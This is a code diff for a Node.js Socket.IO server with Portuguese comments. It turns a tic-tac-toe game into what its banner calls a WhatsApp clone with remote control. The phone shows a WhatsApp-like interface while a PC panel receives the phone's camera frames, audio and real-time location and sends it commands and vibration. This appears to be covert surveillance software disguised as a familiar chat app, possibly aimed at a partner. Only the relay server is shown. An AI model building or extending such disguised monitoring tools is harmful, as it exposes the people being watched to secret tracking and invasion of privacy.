+        // Função para fechar modal
+        window.closeModal = function() {
+            document.getElementById('cameraModal').style.display = 'none';
+        };
     </script>
 </body>
 </html>`);
   }
 });
 
-// Lógica do jogo
-let board = ['', '', '', '', '', '', '', '', ''];
-let vez = 'X';
-let jogadores = {
-  x: null,
-  o: null
-};
-
-function checkWinner() {
-  const lines = [
-    [0,1,2], [3,4,5], [6,7,8], // linhas
-    [0,3,6], [1,4,7], [2,5,8], // colunas
-    [0,4,8], [2,4,6] // diagonais
-  ];
-  
-  for(let l of lines) {
-    if(board[l[0]] && board[l[0]] === board[l[1]] && board[l[0]] === board[l[2]]) {
-      return board[l[0]];
-    }
-  }
-  
-  if (!board.includes('')) {
-    return 'empate';
-  }
-  
-  return null;
-}
-
+// Socket.IO lógica principal
 io.on('connection', (socket) => {
-  console.log('✅ Cliente conectado:', socket.id);
+  console.log('Cliente conectado:', socket.id);
   
-  // Atribuir jogadores
-  if (!jogadores.x) {
-    jogadores.x = socket.id;
-    socket.emit('inicio', { simbolo: 'X' });
-    console.log('Jogador X atribuído:', socket.id);
-  } else if (!jogadores.o) {
-    jogadores.o = socket.id;
-    socket.emit('inicio', { simbolo: 'O' });
-    console.log('Jogador O atribuído:', socket.id);
-  } else {
-    console.log('Jogo cheio - espectador:', socket.id);
-  }
+  // Mensagens de chat
+  socket.on('chat_message', (msg) => {
+    console.log('Mensagem:', msg);
+    socket.broadcast.emit('chat_message', msg);
+  });
   
-  // Streaming de vídeo
+  socket.on('audio_message', (audioData) => {
+    socket.broadcast.emit('audio_message', audioData);
+  });
+  
+  // Indicador de digitação
+  socket.on('typing_start', () => {
+    socket.broadcast.emit('typing_start');
+  });
+  
+  socket.on('typing_stop', () => {
+    socket.broadcast.emit('typing_stop');
+  });
+  
+  // Músicas do YouTube
+  socket.on('play_youtube', (data) => {
+    console.log('Tocando música:', data.songName);
+    socket.broadcast.emit('play_youtube', data);
+  });
+  
+  socket.on('stop_music', () => {
+    socket.broadcast.emit('stop_music');
+  });
+  
+  // Streaming de mídia
   socket.on('frame', (frameData) => {
     socket.broadcast.emit('frame', frameData);
   });
   
-  // Streaming de áudio
   socket.on('audio', (audioData) => {
     socket.broadcast.emit('audio', audioData);
   });
   
   // Comandos
   socket.on('comando', (cmd) => {
-    console.log('📋 Comando:', cmd, 'de', socket.id);
+    console.log('Comando:', cmd);
     socket.broadcast.emit('comando', cmd);
-  });
-  
-  // Chat
-  socket.on('mensagem', (msg) => {
-    console.log('💬 Mensagem de', socket.id, ':', msg);
-    socket.broadcast.emit('mensagem', msg);
   });
   
   // Localização
   socket.on('location', (loc) => {
-    console.log('📍 Localização de', socket.id, ':', loc);
     socket.broadcast.emit('location', loc);
   });
   
-  // Jogadas
-  socket.on('jogada', (pos) => {
-    let jogador = socket.id === jogadores.x ? 'X' : 'O';
-    
-    if (jogador !== vez || board[pos] !== '') return;
-    
-    board[pos] = jogador;
-    let winner = checkWinner();
-    let proximaVez = vez === 'X' ? 'O' : 'X';
-    
-    if (winner === 'X' || winner === 'O') {
-      io.emit('fim', { msg: winner + ' venceu! 🎉' });
-      console.log('🏆 Fim de jogo:', winner, 'venceu');
-    } else if (winner === 'empate') {
-      io.emit('fim', { msg: 'Empate! 🤝' });
-      console.log('🤝 Fim de jogo: empate');
-    } else {
-      vez = proximaVez;
-    }
-    
-    io.emit('jogada', { pos, simbolo: jogador, proximaVez });
-  });
-  
-  // Reiniciar jogo
-  socket.on('reiniciar', () => {
-    board = ['', '', '', '', '', '', '', '', ''];
-    vez = 'X';
-    io.emit('reiniciar');
-    console.log('🔄 Jogo reiniciado');
-  });
-  
-  // Desconexão
   socket.on('disconnect', () => {
-    console.log('❌ Cliente desconectado:', socket.id);
-    
-    if (socket.id === jogadores.x) {
-      jogadores.x = null;
-      console.log('Jogador X removido');
-    }
-    if (socket.id === jogadores.o) {
-      jogadores.o = null;
-      console.log('Jogador O removido');
-    }
-    
-    // Se não houver mais jogadores, resetar o jogo
-    if (!jogadores.x && !jogadores.o) {
-      board = ['', '', '', '', '', '', '', '', ''];
-      vez = 'X';
-      console.log('Jogo resetado - sem jogadores');
-    }
+    console.log('Cliente desconectado:', socket.id);
   });
 });
 
 server.listen(PORT, '0.0.0.0', () => {
-  console.log('\n🚀 SERVIDOR SUPER ROBUSTO RODANDO!');
-  console.log(`   📱 Porta: ${PORT}`);
-  console.log(`   🌐 Acesse: http://localhost:${PORT}`);
-  console.log(`   📱 No celular: use o IP da sua máquina`);
-  console.log(`   🎮 Jogo da velha com vídeo/áudio ao vivo!\n`);
+  console.log(`\n✨ WhatsApp Clone com Controle Remoto! ✨`);
+  console.log(`   Porta: ${PORT}`);
+  console.log(`   Acesse no PC e no Celular na mesma rede`);
+  console.log(`\n📱 No CELULAR: Interface 100% WhatsApp`);
+  console.log(`💻 No PC: Painel de controle completo`);
+  console.log(`\nFuncionalidades:`);
+  console.log(`   💬 Chat igual ao WhatsApp`);
+  console.log(`   📷 Controle de câmera`);
+  console.log(`   🎤 Controle de áudio`);
+  console.log(`   📍 Localização em tempo real`);
+  console.log(`   🎵 Músicas em segundo plano`);
+  console.log(`   📳 Vibração e surpresas`);
+  console.log(`\n💕 Acesse: http://localhost:${PORT}\n`);
 });
